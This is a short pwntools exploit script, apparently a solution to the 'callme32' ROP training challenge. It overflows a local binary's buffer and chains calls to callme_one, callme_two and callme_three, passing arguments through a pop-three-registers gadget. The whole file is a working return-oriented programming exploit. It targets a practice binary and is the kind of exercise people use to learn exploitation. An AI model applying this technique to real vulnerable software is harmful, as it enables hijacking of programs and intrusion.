#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('callme32')
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

# ROPGadget --binary callme32
pop3ret = 0x080488a9  # pop esi ; pop edi ; pop ebp ; ret


if __name__ == '__main__':
    proc = elf.process()

    payload = 11 * b'AAAA'
    payload += p32(callme_one)
    payload += p32(pop3ret)
    payload += p32(1) + p32(2) + p32(3)

    payload += p32(callme_two)
    payload += p32(pop3ret)
    payload += p32(1) + p32(2) + p32(3)

    payload += p32(callme_three)
    payload += p32(pop3ret)
    payload += p32(1) + p32(2) + p32(3)

    proc.recvuntil('>')
    proc.sendline(payload)
    proc.recvall()
